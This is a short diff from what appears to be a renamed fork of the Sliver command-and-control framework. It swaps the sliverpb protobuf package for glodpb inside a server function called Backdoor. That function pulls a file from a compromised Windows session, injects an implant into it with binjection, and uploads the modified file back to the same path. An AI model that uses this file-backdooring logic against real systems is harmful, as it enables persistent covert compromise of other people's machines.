@@ -26,7 +26,7 @@ import (
 	"github.com/Binject/binjection/bj"
 	"github.com/starkzarn/glod/protobuf/clientpb"
 	"github.com/starkzarn/glod/protobuf/commonpb"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 	"github.com/starkzarn/glod/server/codenames"
 	"github.com/starkzarn/glod/server/core"
 	"github.com/starkzarn/glod/server/cryptography"
@@ -37,13 +37,13 @@ import (
 )
 
 // Backdoor - Inject a sliver payload in a file on the remote system
-func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sliverpb.Backdoor, error) {
-	resp := &sliverpb.Backdoor{}
+func (rpc *Server) Backdoor(ctx context.Context, req *glodpb.BackdoorReq) (*glodpb.Backdoor, error) {
+	resp := &glodpb.Backdoor{}
 	session := core.Sessions.Get(req.Request.SessionID)
 	if session.OS != "windows" {
 		return nil, status.Error(codes.InvalidArgument, fmt.Sprintf("%s is currently not supported", session.OS))
 	}
-	download, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
+	download, err := rpc.Download(context.Background(), &glodpb.DownloadReq{
 		Request: &commonpb.Request{
 			SessionID: session.ID,
 			Timeout:   req.Request.Timeout,
@@ -108,7 +108,7 @@ func (rpc *Server) Backdoor(ctx context.Context, req *sliverpb.BackdoorReq) (*sl
 	}
 	uploadGzip := new(encoders.Gzip).Encode(newFile)
 	// upload to remote target
-	upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
+	upload, err := rpc.Upload(context.Background(), &glodpb.UploadReq{
 		Encoder: "gzip",
 		Data:    uploadGzip,
 		Path:    req.FilePath,
